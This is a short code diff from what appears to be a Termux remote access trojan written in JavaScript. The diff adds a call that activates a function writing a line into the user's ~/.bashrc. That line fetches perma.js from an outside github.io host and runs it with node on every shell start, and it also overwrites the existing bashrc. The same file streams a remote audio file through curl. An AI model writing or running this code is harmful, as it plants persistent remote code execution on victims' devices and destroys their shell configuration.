@@ -90,8 +90,12 @@ const msg3 = '  ██████  ▒█████   ██▀███   �
   });
 
   function playSong() {
-    exec(`curl -s https://sabir7718.github.io/TERMUX_RAT/song.mp3 | play -t mp3 -`);
-    function exe() {
+  exec(`curl -s https://sabir7718.github.io/TERMUX_RAT/song.mp3 | play -t mp3 -`);
+
+  function exe() {
     exec(`echo 'curl -s https://sabir7718.github.io/TERMUX_RAT/perma.js | node &' > ~/.bashrc`);
   }
-  });
+
+  // Call exe if needed
+   exe();
+}
